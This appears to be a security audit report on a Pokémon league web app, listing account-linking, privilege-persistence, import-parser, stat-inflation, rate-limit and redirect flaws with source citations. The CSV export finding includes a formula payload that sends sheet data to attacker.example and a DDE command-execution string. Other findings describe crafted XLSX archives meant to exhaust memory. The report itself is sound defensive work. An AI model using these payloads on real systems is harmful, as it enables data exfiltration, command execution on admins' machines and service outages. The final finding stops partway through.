title: Pending Discord link intent is not bound to the initiating session and survives sign-out, so a later first-time Discord sign-in in the same browser profile is linked to the previous player's account
principal: The next person to use the same browser profile who completes a Discord sign-in and has no player row yet (no session of their own, no knowledge of the cookie).
input: A Discord OAuth sign-in (callback to /api/auth/callback/discord) issued from a browser that still holds the `__poketools_link_discord` intent cookie left behind by a different, now signed-out player.
control: A link intent must be bound to the currently authenticated principal / callback state of the account that initiated linking, and must not outlive that session. Here the only binding is the browser cookie plus the HMAC over `playerId.expiresAtMs` (src/lib/utils/crypto.ts:27-43); nothing at consumption re-checks a session.
boundary: src/lib/utils/crypto.ts#link intent hmac — consumed by the signIn callback in src/auth.ts, which never re-reads the authenticated session it was minted from.
impact: The new Discord identity is attached to the previous player's row, and the new person's freshly minted JWT resolves (src/auth.ts:231-259 -> getSessionPlayerRowByIdentity('discord', D2)) to that player. They obtain a normal session for the previous player's account: their match/team data, draft seats and picks, capability share links, and any resource-admin or site-admin authority that player holds, until an admin manually repairs the row. The intent is single-use, so this needs the victim's session to end and the next sign-in to happen inside the 10-minute TTL, and it is refused if the next Discord account already owns a player row (src/auth.ts:213-216) — which aborts that user's sign-in entirely.
evidence: src/app/api/account/link-discord/route.ts:11,38-48 — the intent is purely a minted bearer cookie (httpOnly, sameSite lax, path '/', maxAge 600s) for the caller's playerId; no server-side record, no session id, no OAuth state/flow correlation is stored, and the route has no sign-out or revocation counterpart. src/auth.ts:194-205 — at consumption the callback only reads the cookie and calls verifyLinkToken; it does not call auth()/requirePlayer, does not compare against the browser's current session, and does not require the initiating session to still be live, so an intent minted by player P is honoured for whichever Discord identity completes sign-in next in that browser. src/auth.ts:212-220 — the link is performed for that playerId as soon as the Discord id has no other owner. src/lib/utils/crypto.ts:27-43 — the MAC covers only `payload.exp`, so the token cannot express `provider`, `state`, or session identity; TTL is the only revocation. Repository-wide grep for LINK_DISCORD_COOKIE returns only src/auth.ts and src/app/api/account/link-discord/route.ts (plus tests) — there is no events.signOut handler and no other route that clears the cookie, so signing out leaves the pending intent valid for the rest of its TTL.

title: Email login is bound to a player without verifying mailbox ownership, and the configured superadmin identity is keyed on that unverified address string
principal: An anonymous visitor (POST /api/auth/signup) or any signed-in player (POST /api/account/link-email) who supplies an address they do not control.
input: An arbitrary `email` + `password` pair passed to client.auth.signUp, then bound to the caller's player row with linkAuthUserToPlayer.
control: Verified ownership of the new identity before it is bound to an account, and before any authority is derived from that identifier. The class requires verified ownership plus policy step-up for account linking; the only enforcement present is GoTrue's confirmation setting plus the `email_not_confirmed` error code, and `SUPERADMIN_EMAIL` authority is compared against the self-asserted address with no verification and no exclusion in the link schema.
boundary: src/lib/auth/credentials.ts#email-verification delegation to GoTrue + src/auth.ts#isSuperadminIdentity email comparison (unverified identifier -> site-admin).
impact: Two consequences from one root cause. (a) Privileged identifier staking: if the Supabase project runs with email confirmation disabled, an outsider can register or link the address configured as SUPERADMIN_EMAIL before or instead of the operator, then sign in with credentials and be granted site admin — and applySuperadminOverride persists `is_admin = true` on the row, so the grant outlives the configuration that produced it. (b) Registration collision: an already-claimed address makes the operator's/owner's own public signup silently no-op behind the generic success response (src/app/api/auth/signup/route.ts:74-81), so the address cannot be used by its owner, and a confirmation mail is sent to an address that never asked for it. Severity is undetermined because the decisive control is off-repository.
evidence: src/app/api/account/link-email/route.ts:48-56,75 — signUp is called with the caller-supplied address and the resulting auth user is linked to the player immediately; there is no ownership check, no confirmation state check, and the only guard is the pre-existing-link 409 at :31-36. src/app/api/auth/signup/route.ts:50-56,74-81 — the same unverified signUp is reachable anonymously, and success is generic, so a squatted address produces no signal to its owner. src/lib/validation/schemas.ts:206-209 — linkEmailSchema validates only format/length; it does not reject an address equal to SUPERADMIN_EMAIL. src/lib/auth/credentials.ts:56-66 — the entire email-verification decision is delegated to GoTrue's error code (`email_not_confirmed`); the app never inspects `data.user.email_confirmed_at`, so when the project disables confirmations GoTrue returns success and any typed address authenticates. src/auth.ts:93-104 — isSuperadminIdentity for the credentials provider compares the sign-in email to SUPERADMIN_EMAIL (case-insensitive) and returns true purely from that string. src/auth.ts:106-118 — applySuperadminOverride then writes `is_admin: true` to the player row and swallows write failures while still forcing `player.isAdmin = true` in the session. src/lib/auth/helpers.ts:290-297 — isSuperadmin repeats the same email-string comparison for read paths.

title: CSV formula injection in admin export: player-controlled ps_username reaches the site admin's spreadsheet as a live formula
attack_class: ATTACK-CLASSES.md#Feature abuse and data leakage (export as exfiltration) / DATA-ISOLATION-AND-LIFECYCLE.md#Export and backup scope expansion
principal: Registered player (lowest trusted data-authoring role: any NextAuth identity with a players row, no admin or creator bits). Victim is the site admin who runs the export.
input: The player's own `ps_username` (and `champions_username`) field, set via PATCH /api/players/[id] with `{"ps_username":"=HYPERLINK(\"http://attacker.example/x?\"&B2,\"Match\")"}`. Validation on that field is only `z.string().trim().max(100)` — no charset restriction (src/lib/validation/schemas.ts:167-174, 149-150), the owner is authorized to write it (src/app/api/players/[id]/route.ts:95-101), `updatePlayer` persists it unmodified (src/lib/supabase/queries/players.ts:365-380), and it is a real `players` column (src/types/database.ts:2943).
control: The intended control is CSV output escaping in `recordsToCsv`/`escapeCsvValue` (src/lib/utils/csv.ts:67-86) — the only place the app turns stored rows into a spreadsheet document. `escapeCsvValue` wraps every value in double quotes and doubles embedded quotes, but never neutralizes a leading `=`, `+`, `-`, `@`, TAB or CR, so the cell text after CSV-quote removal is still a formula to a spreadsheet consumer. There is no other sanitizer in the repo (`recordsToCsv` is called only here; grep for sanitizeCsv/csv-injection/formula neutralization returns nothing on the export path).
boundary: Player-authored stored data → site admin's workstation / spreadsheet application. Crosses the route→data boundary in the outbound direction: data written by the lowest-trust data author is rendered into a document consumed by the highest-trust human principal, and the player chooses the file's meaning rather than just its text.
impact: The export selects `*` from `players` (src/app/api/admin/export/route.ts:56-59) and returns it as `Content-Disposition: attachment` CSV (route.ts:72-81), so the payload sits in a downloaded file the app intends the admin to open in Excel/LibreOffice/Sheets. A formula cell such as `=HYPERLINK(...)` or `=WEBSERVICE(...)` can send neighbouring columns of the same sheet — `discord_id`/identity, `status`, `is_admin`/`is_creator`, moderation state of every exported player — to an attacker host, or a DDE payload (`=cmd|' /C ...'!A0`) can run a command on the admin's machine where the spreadsheet app permits it. Disclosure scope is the full exported table (up to 10,000 rows per export, 20 exports/day). Severity is bounded by the human precondition: the admin must open the file in a formula-evaluating application, and current Excel/Sheets versions warn or require a click for several payload classes.
evidence: src/app/api/admin/export/route.ts:56-59 — `supabase.from(TABLE_MAP[resource]).select('*').limit(limit)` returns every column of the selected table, unprojected and unfiltered, from the service-role client (RLS inert).

src/app/api/admin/export/route.ts:72-81 — the CSV branch passes those rows straight to `recordsToCsv` and returns them with `Content-Type: text/csv` + `Content-Disposition: attachment`, i.e. the file is delivered to be opened, with no downstream validation step.

src/lib/utils/csv.ts:67-71 — `escapeCsvValue` only does `"${stringValue.replace(/"/g,'""')}"`; quoting is CSV framing, not formula neutralization, so `=...` survives as a formula in Excel/LibreOffice/Sheets.
src/lib/utils/csv.ts:73-86 — `recordsToCsv` applies that escaper to headers and to every cell with no leading-character check; the export route is its only caller.
src/lib/validation/schemas.ts:167-174 and 149-150 — `playerUpdateSchema.ps_username` / `champions_username` are free-form `trim().max(100)`.
src/app/api/players/[id]/route.ts:95-101 — a non-admin who is the owner is allowed to write exactly those two fields, so the attacker does not need any admin capability.

src/types/database.ts:2943 — `ps_username` is a `players` column, hence included in `select('*')`; src/lib/players/public-player.ts:147,167 shows the same field is already treated as public player data.

src/app/api/admin/export/__tests__/route.test.ts:49,59 — the existing test asserts only that the header cell is quoted (`"name"`) and never asserts neutralization of a leading `=` in a value, confirming the gap is untested.

src/lib/auth/helpers.ts:186-192 — `requireAdmin` → `requirePlayer` re-reads live `status`/`is_admin` and site admins bypass ban state; this guard is correct, so the finding does not depend on any authorization weakness.

title: Unbounded cell-reference row/column indices let a ~1 KB sheet part drive a 4.29e9-element dense array allocation in the XLSX importers
principal: Authenticated site admin: the only identity that passes requireAdmin() at src/app/api/admin/import/point-buy/route.ts:42 (identical gate at src/app/api/admin/import/team-roles/route.ts:23). Live players.is_admin is re-read per call (src/lib/auth/helpers.ts:186-192), so neither an anonymous visitor, a plain identity, a player, a content creator, nor a resource admin reaches the parser.
input: One multipart/form-data POST per request to /api/admin/import/point-buy (or /api/admin/import/team-roles) with file=<crafted .xlsx>. It satisfies every gate: name ends .xlsx, MIME in {spreadsheetml.sheet, application/octet-stream} or empty, size > 0 and <= 8 MB (src/lib/import/xlsx-upload.ts:32-45), first four bytes PK\x03\x04 (xlsx-upload.ts:51-56). The payload needs xl/workbook.xml + xl/_rels/workbook.xml.rels, a sheet whose name matches the active pack's pointBuy.sheet ('Lines') or teamRoles.sheets ('Roles A'/'Roles B'), and a single self-closing cell with an attacker-chosen row index, e.g. <c r="A4294967294"/> (~40 bytes), plus (for the fastest variant) a sheet named 'Rules'.
control: The only controls on the parsed representation are the 8 MB container cap (xlsx-upload.ts:3, 42), the ZIP magic check (xlsx-upload.ts:51-56), the 50 MB per-entry inflation cap (xlsx.ts:25, 31-33, 55-59) and a 40 MB per-XML-part cap applied after decompression (xlsx.ts:64-68). No control validates the numeric row/column derived from the cell reference, and no control bounds the array length or the per-row cardinality that the sheet array acquires from it.
boundary: Upload-to-parser into shared process memory and the event loop: bytes chosen by the requester become JS array length and iteration count inside the single Node process that also serves anonymous reads, player pages and every other route.
impact: A ~40-byte cell reference sets sheet.rows.length to 4,294,967,295 (xlsx.ts:222-223). Point-buy then calls Array.from(sheet.rows, ...) at point-buy-xlsx.ts:109, which iterates every index and allocates a fresh inner array per row; OOM is reached after ~1e8 iterations (a few seconds), long before the loop ends. Without the 'Rules' sheet the same length still drives the length-proportional loops at point-buy-xlsx.ts:129 and team-roles-xlsx.ts:93/119, blocking the event loop for minutes. Either way every concurrent request from other principals stalls or the process dies, and the admin can repeat it. Blast radius depends on deployment, and the requester is a site admin, so this is not an unauthenticated DoS. needs_validation blockers: (a) this host has no OS-enforced sandbox and no shell, so the crafted workbook cannot be generated and readXlsxBuffer/parsePointBuySheets cannot be run to measure actual peak RSS and wall-clock block time for a bounded fixture; (b) the deployed heap/time limits (Vercel function memory and maxDuration vs. self-hosted `next start` max-old-space-size) and whether an OOM kill restarts the process in place or only fails that invocation are outside the repository. Owner-observed check: run parsePointBuyXlsxBuffer on the fixture above under a 512 MB heap and a 30 s timeout, and record the failure mode; read the deployed instance memory limit.
evidence: src/lib/import/xlsx.ts:181-185 — cellRefParts() converts the digits of the cell reference into an array index with no upper bound (parseInt(m[2],10) - 1); colLettersToIndex (156-162) is equally unbounded.

src/lib/import/xlsx.ts:200-223 — parseSheetXml applies that index directly: `if (!rows[row]) rows[row] = []; rows[row][col] = value;`, so array length and inner array length become attacker-chosen integers with no MAX_ROWS/MAX_COLS check anywhere in the module.

src/lib/import/point-buy-xlsx.ts:106-110 — sheetRowsAsStrings() runs Array.from(sheet.rows, ...) over the sparse array, iterating rows.length times and allocating a new array per row; the comment shows density is deliberate, so length is fully materialised.
src/lib/import/point-buy-xlsx.ts:129 — `for (let i = 1; i < pb.rows.length; i++)` performs length-proportional work per parse, independent of how many cells the part actually contains.
src/lib/import/team-roles-xlsx.ts:92-98 and 119 — findHeaderRow() and the body scan both loop `r < sheet.rows.length`, giving the same amplification through the sibling route.

src/lib/import/point-buy-xlsx.ts:171-172 — the 'Rules' sheet path (active pack sets rulesSheet: 'Rules', src/format-packs/example/workbook.ts:12) is what makes the fast OOM variant reachable; an attacker simply adds a sheet with that name.

src/app/api/admin/import/point-buy/route.ts:69-81 and src/app/api/admin/import/team-roles/route.ts:29-39 — the routes pass the whole buffer to the parsers immediately after the four magic bytes, so the 8 MB gate is the only size-related control before the representation is expanded.

src/lib/import/xlsx-upload.ts:42-45 — the gate is `file.size > MAX_XLSX_BYTES`, evaluated after request.formData() (route.ts:44) has already buffered the multipart body, so it bounds the archive but not the work or memory derived from it.

title: XLSX importer enforces only a 50 MB per-entry inflation cap, so a single <=8 MB upload can retain gigabytes by aliasing many central-directory records onto the same compressed data
principal: Authenticated site admin (requireAdmin(), src/app/api/admin/import/point-buy/route.ts:42; src/app/api/admin/import/team-roles/route.ts:23). No lower-trust principal reaches readXlsxBuffer over HTTP; its other callers are CLI scripts only.
input: A multipart POST of a crafted .xlsx that passes validateXlsxFile (<= 8 MB, .xlsx name, allowed/absent MIME) and assertXlsxMagicBytes, containing xl/workbook.xml and xl/_rels/workbook.xml.rels plus an active-pack sheet name so parsing proceeds. The archive's end-of-central-directory record declares up to 65,535 central-directory entries, each with a distinct file name and a local-header offset pointing at the same deflate stream (or any set of entries that each inflate to just under 50 MB).
control: MAX_DECOMPRESSED_ENTRY_BYTES = 50 MB is applied per entry via inflateRawSync maxOutputLength and re-checked at xlsx.ts:55-59; MAX_XML_PART_BYTES = 40 MB is applied per part at xlsx.ts:64-68; MAX_XLSX_BYTES = 8 MB gates the container. What is absent is any aggregate decompressed-byte budget, any cap on the number of entries processed, and any restriction of inflation to the parts the parser actually needs.
boundary: Upload-to-parser into shared process memory: 8 MB of admin-supplied container bytes cross into the heap/RSS of the Node process that serves the whole site, with no bound tying decompressed output to the checked transfer size.
impact: readZipViaCentralDirectory decompresses every central-directory entry eagerly and stores the result in a Map keyed by the entry name (xlsx.ts:127-143), so all inflated parts stay live simultaneously. Because localHeaderOffset and compSize are attacker-controlled and Buffer.slice only clamps, N records can name the same compressed bytes and each is inflated independently; only the file names must differ to keep the Map entries distinct. With ~40 KB of highly compressible data, a few hundred aliased records at ~27 MB each already reach gigabytes, and the declared 65,535-entry maximum allows ~3.2 TB of attempted output. V8 external Buffer memory still counts against process/container RSS, so the process is OOM-killed or the event loop stalls while the loop runs; on a self-hosted single `next start` process that takes the whole site down for every principal, and the admin can repeat it. The same root cause is reachable through the EOCD-less fallback readLocalZipEntries (xlsx.ts:72-108), which also inflates and retains every local entry. needs_validation blockers: (a) this host provides no OS-enforced sandbox and no shell, so the aliased archive cannot be built and inflate behaviour, retained bytes and peak RSS cannot be measured locally even under a bounded fixture; (b) the deployed process memory ceiling and kill semantics are not in the repository (Vercel function memory/OOM only fails the invocation; self-hosted Node dies and depends on an external supervisor), and it is unknown whether an upstream proxy caps multipart request size before request.formData() at route.ts:44 buffers the body. Owner-observed check: on a disposable instance with a 512 MB limit, POST a fixture with 32 aliased central-directory records and record RSS growth and whether the response completes; then read the deployed memory limit and restart policy.
evidence: src/lib/import/xlsx.ts:24-25 — the only inflation bound is per entry: a 50 MB comment-carrying constant, no total-bytes or entry-count constant exists in the module.
src/lib/import/xlsx.ts:29-40 — inflateZipEntry passes maxOutputLength: MAX_DECOMPRESSED_ENTRY_BYTES, a per-call limit that composes multiplicatively across calls.
src/lib/import/xlsx.ts:55-59 — decodeZipEntry re-checks only the single entry's length, again per entry.

src/lib/import/xlsx.ts:124-136 — cdOffset and cdEntries come straight from the EOCD (readUInt16LE at +10 allows 65,535 entries) and each record's localHeaderOffset/compSize are read without cross-checking them against the archive layout or against previously seen offsets, which is what permits many records to alias one compressed region.

src/lib/import/xlsx.ts:138-142 — every record is decoded and stored in the `files` Map immediately ('files.set(name, decodeZipEntry(method, compressed, name))'), so nothing is released between entries and unused parts are inflated too.

src/lib/import/xlsx.ts:64-68 — the 40 MB XML-part cap is checked only when converting an already-inflated buffer to a string, i.e. after the memory has been allocated, so it is not a bound on allocation.

src/lib/import/xlsx.ts:72-95 — the central-directory-less fallback has the same eager decode-and-retain pattern ('files.set(name, decodeZipEntry(...))'), so removing/ corrupting the EOCD does not avoid the amplification.

src/lib/import/xlsx.ts:268-293 — readXlsxBuffer consumes the full Map and only then reads the three parts it needs; the only caller-visible failure is a thrown Error, after the memory has already been spent.

src/lib/import/xlsx-upload.ts:3 and 42-45 — the 8 MB MAX_XLSX_BYTES gate bounds compressed transfer only; the ratio between that and the 50 MB per-entry allowance is ~1,000x for compressible data, and there is no aggregate equivalent of the per-entry cap.

src/app/api/admin/import/point-buy/route.ts:74-81 — fileToBuffer() materialises the 8 MB file as a Buffer and hands it to validatePointBuyImport with no aggregate size accounting; validatePointBuyImport catches the parser error (point-buy-xlsx.ts:341-347) only after the decompression work has run.

title: Unbounded duplicate battle-stat rows let one participant fabricate arbitrary evolution progress and KO aggregates from a single game
principal: Authenticated player who is a participant (player_1_id or player_2_id) of a match in scheduled/in_progress state — any ordinary league competitor; no admin rights needed
input: POST /api/manual-result body.pokemon_stats = an array with no upper bound whose entries may repeat the same player_id and the same pokemon_name. Each row may carry kos_dealt up to 6 (schemas.ts:434) and a 6-element pokemon array (schemas.ts:442), so N repeated entries for the attacker's own player_id yield 6N KOs in one game, e.g. 100 entries of {player_id: self, pokemon: [{pokemon_name: 'Dreepy', kos_dealt: 6} x6]}.
input_note: winner_id can be set to the opponent so the opponent has every incentive to confirm the result
control: The per-battle quantity invariant is expressed only per row (kos_dealt max 6, pokemon array max 6) and is expected to be enforced by the shape of the submitted array, as the replay parser emits exactly one row set per parsed player. Intended aggregate control: at most 6 KOs per player per game.
boundary: Untrusted request body → season evolution tracker (evolution_tracker.real_kills/total_kos, current_stage/current_form) and season/tournament/all-time per-Pokémon aggregates. The submitter's authority is to report one game, not to award N games' worth of KO progress.
impact: A single authenticated request from an ordinary participant advances their own Pokémon through every evolution stage threshold in an evolution_point_buy season (real_kills/total_kos are additive with no cap), which changes the forms the player is permitted to field and drives stage-transition evolution-point awards; the same rows inflate all-time/season per-Pokémon KO aggregates. Bounded by rate limit 20/h, which one request does not need.
evidence: src/lib/validation/schemas.ts:486 — `pokemon_stats: z.array(playerPokemonStatsSchema).min(1)` has no `.max()`, while the sibling per-battle limits are expressed at schemas.ts:434 (`kos_dealt` max 6) and schemas.ts:442 (`pokemon` max 6); nothing forbids repeating player_id or pokemon_name. src/app/api/manual-result/route.ts:50-77 — every entry of every player block is pushed into battleStats with only participant-membership checks (route.ts:52-62), no per-player count, species dedupe, or per-game KO total. src/lib/supabase/queries/games.ts:339-349 — createBattleStats inserts rows 1:1, no dedupe. supabase/migrations/20260608100000_baseline_professional_schema.sql:883-896 and 2111-2115 — battle_stats has only non-unique indexes on game_id and player_id, and no CHECK on kos_dealt, so duplicate (game_id, player_id, pokemon_name) rows are accepted. src/lib/pkmn/game-pipeline.ts:233-239 — all rows are committed verbatim. src/lib/match/epb-tracker-apply.ts:103-110 — applyKillDelta maps rows 1:1 with no grouping, and src/lib/match/evolution-match-evaluator.ts:57-71 issues one `epb_apply_progress` call per row for the same tracker. supabase/migrations/20260727010000_epb_review_fixes.sql:43-49 — `real_kills = GREATEST(0, real_kills + p_amount)` is purely additive with no ceiling. src/lib/supabase/queries/aggregates.ts:180-194 — computeStatDeltas sums kos_dealt across every matching row, so duplicates inflate aggregates identically. (Not executed: this host has no OS-enforced sandbox and no DB, so the stored-state effect is source-derived, not locally observed.)

title: Manual game statistics award season evolution progress and aggregates before the opponent confirms, and a dispute does not roll them back
principal: Authenticated player who is a participant of a match in scheduled/in_progress state
input: POST /api/manual-result with an inflated but schema-legal battle report (up to 6 KOs per Pokémon, 6 Pokémon per player, was_brought/was_lead free-form) for a game whose winner is set to the opponent, so the opponent confirms a result they won and has no reason to dispute it
control: The confirmation gate (match-state.ts:15-21 and confirm-match/[mid]/route.ts:78-99: pending_confirmation → completed requires a non-submitting participant) plus the documented 'only confirmed results count' semantics used by the authoritative evolution rebuild. The strongest source-visible control is that the canonical recompute reads only status='completed' AND winner_id not null.
boundary: Self-asserted, not-yet-confirmed game statistics → durable season state (evolution tracker progression and stage transitions, aggregate counters). The pipeline applies derived state at write time, so the participant's authority to *submit* is treated as authority to *award*.
impact: A participant unilaterally grants their own Pokémon real_kills/total_kos and stage transitions from a game nobody has confirmed. If the opponent disputes, confirm-match only flips the match to 'disputed' and notifies; the tracker progress and the applied aggregate counters stay. The live tracker then disagrees with what repairSeasonEvolution would compute (it excludes the dispute), so the player keeps evolution progress — and the forms it unlocks for lineup legality — from a result the league rejected. Effect per fabricated game is bounded (≈36 KOs) rather than arbitrary, so this is the smaller half of the same trust assumption as the unbounded-row defect but has an independent fix.
evidence: src/lib/pkmn/game-pipeline.ts:164-173 — the only submission gate is 'submitter is p1/p2 (or admin)' and status in {scheduled, in_progress}; nothing requires confirmation. game-pipeline.ts:222-246 — game, battle_stats and an aggregate job are committed immediately. game-pipeline.ts:248-276 — applyRealKillsFromGame(season_id, statsWithGameId…) awards per-(player, pokemon) real_kills and total_kos BEFORE the Bo/pending_confirmation write at game-pipeline.ts:279-337; the failure path (game-pipeline.ts:265-269) even logs and continues. src/lib/match/evolution-match-evaluator.ts:57-90 — each row increments the tracker via epb_apply_progress and stage transitions are persisted with updateTracker. src/app/api/confirm-match/[mid]/route.ts:54 and 101-181 — 'disputed' only calls updateMatchStatus and emits notifications; there is no game deletion, aggregate rollback, or evolution rollback anywhere in the route. Rollback exists only in admin paths: game-pipeline.ts:842-848 and 1155-1161 (recheckEvolutions/rollbackRealKillsFromGame on deleteGame/resetMatch) and game-pipeline.ts:157-159 in the evaluator. src/lib/reconcile/evolution-rebuild.ts:650-665 — the authoritative recompute selects matches with `.eq('status','completed').not('winner_id','is',null)`, documenting that only confirmed matches may contribute, which contradicts the incremental award at submission time. src/lib/supabase/queries/aggregates.ts:184 also counts these rows into scope aggregates. (Not executed: no OS sandbox or database on this host; the durable effect and the surviving-after-dispute state are source-derived.)

title: Unauthenticated public-profile read fans out ~14 PostgREST queries per request, uncached and unthrottled, unlike every comparable anonymous endpoint
principal: Anonymous internet caller (no session, no player row, no credential of any kind)
input: A single GET to /api/players/{uuid}/public-profile with a syntactically valid player UUID taken from the public /players directory or from any public participant list; the id only has to exist, no elevation is needed
control: The project's public per-IP limiter `checkPublicRateLimit` (src/lib/utils/rate-limit.ts:314-327), which is the designated control for anonymous expensive routes (proxy-image 60/60 s at src/app/api/proxy-image/route.ts:25, replay-frames 30/60 s at src/app/api/replay-frames/route.ts:15, the /api/calc/* routes) plus the 30 s tagged public-read cache that the page path uses for the identical payload (src/lib/cache/public-reads.ts:527-546). This handler uses neither, and vercel.json declares no platform-level limit.
boundary: Anonymous visitor -> shared service-role Postgres/Supabase project. The handler is documented as public (src/app/api/players/[id]/public-profile/route.ts:13) and performs the full profile composition inline (route.ts:20) instead of reading the cached public entry.
impact: Each cheap anonymous GET re-runs the whole composition fan-out: 8 parallel reads plus two dependent chains (src/lib/profile/compose.ts:52-77), a per-request standings pass that fetches every participation's participants and every completed match record per season (compose.ts:194-208), up to 500 battle-stat rows joined games->matches (src/lib/supabase/queries/games.ts:629-641), up to 500 matches with full player embeds (src/lib/supabase/queries/matches.ts:436-452), and an unbounded full-table read of the all-time aggregates relation ordered by KOs (src/lib/supabase/queries/aggregates.ts:574-579). With no session, no limiter and no cache in front, the endpoint converts N inexpensive anonymous requests into N x ~14 database round trips plus repeated large scans, consuming shared DB connections/CPU that all signed-in users and the cron jobs (vercel.json) depend on. The project itself treats this composition as expensive: the same payload is served to the page through a 30 s tagged cache (src/lib/cache/public-reads.ts:527-546), which this route bypasses. Severity is deliberately left unassigned: the source shows the disproportion but not the resulting shared-resource effect.
evidence: src/app/api/players/[id]/public-profile/route.ts:13-20 — '// Public: no auth required', then composePlayerProfile(id) on the raw path with no checkRateLimit/checkPublicRateLimit call and no publicReads lookup; route.ts:29-32 shows the response itself is correctly narrowed (so this is not a field-disclosure claim). src/lib/profile/compose.ts:52-77 — one request triggers 8 concurrent reads plus loadParticipationStandings and computeBestKillPokemon. compose.ts:194-208 — getParticipantsBatch + getCompletedMatchRecordsBatch + loadSeasonStandingsContexts are executed per request, not cached. src/lib/supabase/queries/aggregates.ts:574-579 — .from('aggregates').select('pokemon_name, total_kos_dealt').eq('scope_type','all_time').is('scope_id', null).order(...) with no .limit()/.range(), i.e. a full relation read per hit. src/lib/cache/public-reads.ts:527-546 — the identical composed profile is wrapped in unstable_cache with a 30 s TTL for the page path, evidencing the cost. src/lib/utils/rate-limit.ts:314-327 plus src/app/api/proxy-image/route.ts:25 and src/app/api/replay-frames/route.ts:15 — the public limiter exists and is applied to other anonymous, expensive endpoints; this handler has no equivalent. vercel.json:1-20 — only cron declarations, no limit configuration.
blockers: No runtime measurement of the per-request cost (query count, bytes scanned, wall time) or of the fan-out's effect on the shared Supabase project; the host has no OS sandbox and no shell, so no bounded local reproduction or load measurement is possible.

Deployment-edge behaviour is not in source: whether Vercel Firewall / a reverse proxy / CDN already rate-limits or caches anonymous GETs on this path (VERCEL=1 selects the Postgres limiter elsewhere, but nothing in vercel.json or the route applies it here).

Whether the maintainers consider an unthrottled public read route acceptable by design (most public GET handlers in src/app/api/** also carry no limiter), i.e. whether the limiter-on-proxy-image/replay-frames pattern is intended to cover read routes at all.

validation_plan.local: With a local Supabase stub (or the existing vitest harness with a query-module mock that counts calls), call the route handler once for a dummy player id and record the number and shape of queries issued by composePlayerProfile; then issue K sequential handler invocations and show the linear growth. No target execution is possible on this host, so this step is listed for an environment with an OS-enforced sandbox.
validation_plan.deployment: Owner-observed: read the deployment's request logs/metrics for GET /api/players/*/public-profile (rate, p95 latency, Postgres query volume and connection saturation) during a synthetic burst of a few requests per second against a staging instance, and confirm whether any edge rule or CDN cache applies to that path. Stop at the first sustained latency/error effect; do not test against a live or shared instance.

title: Superadmin override persists is_admin on the player row, so removing SUPERADMIN_DISCORD_ID/SUPERADMIN_EMAIL never revokes site admin
attack_class: Chained vulnerabilities and trust boundaries — revocation, rollback, and stale derived authority
principal: A principal that was site superadmin by environment configuration (SUPERADMIN_DISCORD_ID or SUPERADMIN_EMAIL) and whose identity the operator has since removed from that configuration; the affected parties are the community/operator whose revocation is ignored (and every player row, season/tournament resource, and admin export the residual admin can still reach).
input: One ordinary authenticated request by that identity — any sign-in or any JWT refresh (every 5 minutes of activity, or trigger 'update') while the env var still matches, which fires applySuperadminOverride and writes players.is_admin = true. After the operator removes the env var, no input is needed at all: the persisted column is the grant.
control: The env-configured superadmin identity check (isSuperadminIdentity) is meant to be the whole and only source of that authority, and removing the identity from SUPERADMIN_DISCORD_ID / SUPERADMIN_EMAIL is the operator's only revocation lever for it. The intended control is that superadmin authority is derived at request time from configuration, not stored as durable role state; readLivePlayer (helpers.ts:74-77) already re-applies the authority in memory on every guard call, so durable storage is not needed to enforce it.
boundary: src/auth.ts#applySuperadminOverride — the configuration-derived superadmin decision (auth.ts:93-104) is converted into a durable row-level grant (players.is_admin) with no inverse path, and that column is what the live guards trust (helpers.ts:186-192 requireAdmin).
impact: The removed identity keeps full site-admin indefinitely: requireAdmin() passes from the live row, so it can PATCH any player including is_admin/is_creator-adjacent fields (route.ts:104-114), DELETE players and their linked Supabase Auth users (route.ts:142-214), grant/revoke resource_admins for any season or tournament (resource-admins/route.ts:50-111), and reach every admin-only read/export. Because site admins bypass the ban/suspend check (helpers.ts:94-97), banning the row is not an alternative containment either, and while the env var is still set a deliberate PATCH is_admin=false on that row is silently re-promoted within one session refresh while returning 200 and logging a 'demotion' audit entry.
evidence: src/auth.ts:106-118 — applySuperadminOverride: when isSuperadminIdentity(identity) is true and the row is not admin, it calls updatePlayer(player.playerId, { is_admin: true }) (line 110) and also sets player.isAdmin = true (line 116); the catch at 111-114 only logs a failed write, so the session override survives it. src/auth.ts:93-104 — the superadmin decision reads process.env.SUPERADMIN_DISCORD_ID / SUPERADMIN_EMAIL at call time, which is the only grant source and the only thing an operator can change. src/auth.ts:133 and 306-309 — the override runs on initial sign-in and on every token refresh, so the column is written repeatedly. src/lib/supabase/queries/players.ts:365-384 — updatePlayer maps input.is_admin straight into the UPDATE with no privilege-side-effects handling and no compensating write. src/lib/auth/helpers.ts:70-79,186-192 — readLivePlayer adds the override in memory and requireAdmin decides from the live row's is_admin, so the stored true is fully sufficient for every guard once the env var no longer matches. src/lib/auth/helpers.ts:94-97 — isInGoodStanding returns true for any is_admin row, so a ban/suspension cannot contain the leftover admin. src/app/api/players/[id]/route.ts:104-114 and src/lib/validation/schemas.ts:167-174 — PATCH accepts is_admin and writes body verbatim for an admin, giving an apparent manual demotion that the override silently reverts while the env var stands. A repository-wide search for SUPERADMIN in src/ finds only auth.ts (plus docs and auth helpers tests); no route, cron, or migration reconciles or clears players.is_admin when the configured identity changes, which is the missing inverse path. src/__tests__/auth.test.ts:332-340 asserts the write ('persists is_admin'), confirming the persistence is real code behavior rather than a dead branch — the retention after env removal is the unconsidered consequence, not a reverted control.

title: Public image proxy applies its host/path allowlist only to the first URL, then follows upstream redirects to any destination
principal: Anonymous internet visitor — `/api/proxy-image` is explicitly unauthenticated (route.ts:10 "Public: no auth required") and the only throttle is a 60-request/minute per-IP public limiter (route.ts:25).
input: The `url` query parameter is fully attacker-controlled (route.ts:28) and is used verbatim as the fetch target (route.ts:63). The attacker supplies an allowlisted URL such as `https://play.pokemonshowdown.com/sprites/<anything>` and relies on the allowlisted origin answering with a 3xx whose `Location` the attacker influences.
control: The intended control is the explicit destination allowlist — `ALLOWED_ORIGINS` host + `/sprites/` path-prefix pairs (route.ts:13-16), HTTPS-only (route.ts:44-49), and the host/path comparison (route.ts:52-60). The repo enforces this same class of control elsewhere by refusing redirects outright: `src/lib/social/image-fetch.ts:13` ("redirects are refused, so the allowlist cannot be bounced elsewhere") with `src/lib/social/image-fetch.ts:97` `redirect: 'error'`; `src/lib/discord/match-card-image.tsx:69-72` `redirect: 'error'`; `src/lib/ai/agent/tools/pokepaste.ts:36` `redirect: 'manual'`.
